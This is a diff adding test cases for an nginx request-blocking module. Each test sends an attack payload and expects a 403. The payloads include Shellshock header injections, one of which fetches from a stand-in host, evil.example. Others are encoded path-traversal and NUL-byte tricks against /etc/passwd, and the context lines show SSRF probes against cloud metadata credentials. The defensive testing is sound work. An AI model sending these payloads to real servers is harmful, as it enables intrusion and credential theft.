@@ -191,3 +191,104 @@ GET /t?url=http://169.254.169.254/latest/api/token
 --- request
 GET /t?u=/latest/meta-data/iam/security-credentials/admin-role
 --- error_code: 403
+
+=== TEST 26: shellshock — canonical CVE-2014-6271 prologue in the User-Agent
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+User-Agent: () { :;}; /bin/bash -c "id"
+--- error_code: 403
+
+=== TEST 27: shellshock — whitespace-stripped prologue variant
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+User-Agent: (){:;}; echo vulnerable
+--- error_code: 403
+
+=== TEST 28: shellshock — CVE-2014-6278 redirection gadget in the Referer
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+Referer: () { _;} >_[$($())] { echo hi; }
+--- error_code: 403
+
+=== TEST 29: shellshock — mass-scanner "ignored" body
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+User-Agent: () { ignored;}; curl http://evil.example/x
+--- error_code: 403
+
+=== TEST 30: shellshock — prologue whose body is a command
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t
+--- more_headers
+User-Agent: () { echo shellshock; }
+--- error_code: 403
+
+=== TEST 31: overlong — four-byte overlong '/'
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=..%f0%80%80%afetc%f0%80%80%afpasswd
+--- error_code: 403
+
+=== TEST 32: overlong — three-byte overlong '.'
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=%e0%80%ae%e0%80%ae/etc/passwd
+--- error_code: 403
+
+=== TEST 33: overlong — modified-UTF-8 NUL (%c0%80)
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=/etc/passwd%c0%80.png
+--- error_code: 403
+
+=== TEST 34: overlong — IIS %u-encoded separator
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=..%u002f..%u002fetc%u002fpasswd
+--- error_code: 403
+
+=== TEST 35: nullbyte — triple-encoded traversal
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=%25252e%25252e%25252fetc
+--- error_code: 403
+
+=== TEST 36: nullbyte — double-encoded backslash
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=..%255c..%255cwindows
+--- error_code: 403
+
+=== TEST 37: nullbyte — %u-encoded NUL
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=/etc/passwd%u0000.png
+--- error_code: 403
+
+=== TEST 38: nullbyte — digit-encoded "." double encoding
+--- config
+    location /t { shield block; empty_gif; }
+--- request
+GET /t?f=%25%32%65%25%32%65/etc/passwd
+--- error_code: 403
